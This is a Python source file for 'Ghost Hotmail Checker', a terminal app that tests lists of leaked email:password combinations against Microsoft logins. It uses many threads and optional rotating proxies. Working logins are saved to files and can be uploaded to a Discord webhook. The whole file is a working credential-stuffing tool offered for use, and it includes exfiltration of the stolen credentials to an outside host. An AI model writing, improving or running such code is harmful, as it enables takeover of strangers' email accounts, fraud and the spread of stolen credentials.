import random
import threading
import requests
import os
from concurrent.futures import ThreadPoolExecutor
from tempfile import NamedTemporaryFile

from mailhub import MailHub
from colorama import init

from textual.app import App, ComposeResult
from textual.widgets import Button, Checkbox, Input, RichLog, Static
from textual.containers import Vertical, Horizontal

init(autoreset=True)

mail = MailHub()
write_lock = threading.Lock()


def validate_line(line):
    parts = line.strip().split(":")
    if len(parts) == 2:
        return parts[0], parts[1]
    return None, None


class GhostChecker(App):
    CSS = """
    Screen {
        align: center middle;
    }
    Vertical {
        width: 90%;
        height: 95%;
        border: round white;
        padding: 1;
    }
    #title {
        content-align: center middle;
        text-style: bold;
    }
    """

    def compose(self) -> ComposeResult:
        yield Vertical(
            Static("👻 Ghost Hotmail Checker (Termux Edition)", id="title"),

            Input(placeholder="Path to combo file", id="combo"),
            Input(placeholder="Path to proxy file (optional)", id="proxy"),
            Input(placeholder="Discord webhook URL (optional)", id="webhook"),

            Checkbox("Use proxies", id="use_proxy"),

            Horizontal(
                Button("Start", id="start", variant="success"),
                Button("Quit", id="quit", variant="error"),
            ),

            RichLog(id="log", markup=True),  # ✅ colors enabled
        )

    # ---- UI LOGGING (safe, no name collision) ----
    def ui_log(self, message: str):
        self.query_one("#log", RichLog).write(message)

    # ---- LOGIN ATTEMPT ----
    def attempt_login(self, email, password, proxy, hits_file, local_hits_file):
        try:
            res = mail.loginMICROSOFT(email, password, proxy)[0]
            if res == "ok":
                self.ui_log(f"[bold green]VALID[/] | {email}:{password}")
                with write_lock:
                    hits_file.write(f"{email}:{password}\n")
                    hits_file.flush()
                    local_hits_file.write(f"{email}:{password}\n")
                    local_hits_file.flush()
            else:
                self.ui_log(f"[bold red]INVALID[/] | {email}:{password}")
        except Exception as e:
            self.ui_log(f"[red]ERROR[/] {email}:{password} → {e}")

    # ---- MAIN CHECKER LOGIC ----
    def process_combo(self, combo_path, proxies, webhook):
        try:
            with open("valid_hits.txt", "a", encoding="utf-8") as local_hits:
                with NamedTemporaryFile(delete=False, mode="w", encoding="utf-8") as temp_hits:
                    self.ui_log("[cyan]▶ Starting checks...[/]")

                    with open(combo_path, "r", encoding="utf-8", errors="ignore") as combos:
                        with ThreadPoolExecutor(max_workers=50) as executor:
                            for line in combos:
                                email, password = validate_line(line)
                                if not email:
                                    continue

                                proxy = None
                                if proxies:
                                    proxy = {
                                        "http": f"http://{random.choice(proxies).strip()}"
                                    }

                                executor.submit(
                                    self.attempt_login,
                                    email,
                                    password,
                                    proxy,
                                    temp_hits,
                                    local_hits,
                                )

                    self.ui_log("[cyan]✔ Checking finished[/]")

                    if webhook and os.path.getsize(temp_hits.name) > 0:
                        self.send_to_discord(temp_hits.name, webhook)
                    elif webhook:
                        self.ui_log("[yellow]No valid hits to send[/]")

        except Exception as e:
            self.ui_log(f"[bold red]FATAL ERROR[/] {e}")

    # ---- DISCORD WEBHOOK ----
    def send_to_discord(self, file_path, webhook):
        try:
            with open(file_path, "rb") as f:
                response = requests.post(
                    webhook,
                    files={"file": ("valid_hits.txt", f)},
                    data={"content": "VALID HOTMAILS CHECKED"},
                )

            if response.status_code == 204:
                self.ui_log("[bold green]Sent results to Discord[/]")
            else:
                self.ui_log(f"[red]Discord error[/] {response.status_code}")

        except Exception as e:
            self.ui_log(f"[red]Webhook failed[/] {e}")

    # ---- BUTTON HANDLER ----
    def on_button_pressed(self, event: Button.Pressed):
        if event.button.id == "quit":
            self.exit()

        if event.button.id == "start":
            combo = self.query_one("#combo", Input).value.strip()
            proxy_file = self.query_one("#proxy", Input).value.strip()
            webhook = self.query_one("#webhook", Input).value.strip()
            use_proxy = self.query_one("#use_proxy", Checkbox).value

            if not combo or not os.path.exists(combo):
                self.ui_log("[red]Combo file not found[/]")
                return

            proxies = []
            if use_proxy and proxy_file:
                if not os.path.exists(proxy_file):
                    self.ui_log("[red]Proxy file not found[/]")
                    return
                with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
                    proxies = f.readlines()

            threading.Thread(
                target=self.process_combo,
                args=(combo, proxies, webhook),
                daemon=True,
            ).start()


if __name__ == "__main__":
    GhostChecker().run()
